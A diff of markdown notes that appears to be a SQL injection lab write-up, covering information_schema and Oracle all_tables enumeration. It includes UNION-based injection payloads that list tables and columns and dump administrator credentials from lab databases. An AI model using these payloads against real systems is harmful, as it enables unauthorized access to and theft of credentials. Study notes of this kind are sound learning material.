@@ -1,8 +1,12 @@
+---
+tags: ["information gathering", "sqli"]
+---
+
 ==> Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.
 
 -->You can query information_schema.tables to list the tables in the database:
 
-SELECT * FROM information_schema.tables
+SELECT \* FROM information_schema.tables
 
 This returns output like the following:
 
@@ -19,7 +23,7 @@ This output indicates that there are three tables, called Products, Users, and F
 
 You can then query information_schema.columns to list the columns in individual tables:
 
-SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+SELECT \* FROM information_schema.columns WHERE table_name = 'Users'
 
 This returns output like the following:
 
@@ -32,7 +36,7 @@ MyDatabase    dbo          Users      Username    varchar
 MyDatabase    dbo          Users      Password    varchar
 ```
 
-This output shows the columns in the specified table and the data type of each column. 
+This output shows the columns in the specified table and the data type of each column.
 
 ================================================================
 
@@ -45,7 +49,8 @@ This output shows the columns in the specified table and the data type of each c
 -> found 2 columns : 1)username_fuoiaa 2)password_jwsqrn
 -> let's see the content of the tables : `'+UNION+SELECT+username_fuoiaa,password_jwsqrn+FROM+users_zlvypg--`
 
--> found the administrator password: 
+-> found the administrator password:
+
 ```bash
 administrator:ffgwc2jemb2hq113pi87
 ```
@@ -56,15 +61,15 @@ administrator:ffgwc2jemb2hq113pi87
 
 You can list tables by querying all_tables:
 
-SELECT * FROM all_tables
+SELECT \* FROM all_tables
 
 And you can list columns by querying all_tab_columns:
 
-SELECT * FROM all_tab_columns WHERE table_name = 'USERS' 
+SELECT \* FROM all_tab_columns WHERE table_name = 'USERS'
 
-## Challenge 
+## Challenge
 
--> In oracle,there is a table called `dual` so we can use it for finding the number of columns 
+-> In oracle,there is a table called `dual` so we can use it for finding the number of columns
 
 -> first of all find the number of columns : `'+UNION+SELECT+'abc','def'+FROM+dual--`
 -> we got response so Let's use this payload : `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
@@ -75,7 +80,8 @@ SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
 -> got 2 tables : 1)PASSWORD_BIASBO 2)USERNAME_HMHMIU
 -> Let's read the content of this 2 columns : `'+UNION+SELECT+PASSWORD_BIASBO,USERNAME_HMHMIU+FROM+USERS_WYZASZ--`
 
--> got the password of administrator : 
+-> got the password of administrator :
+
 ```bash
 administrator:gjqdv2xrnw5kynwhizpo
 ```
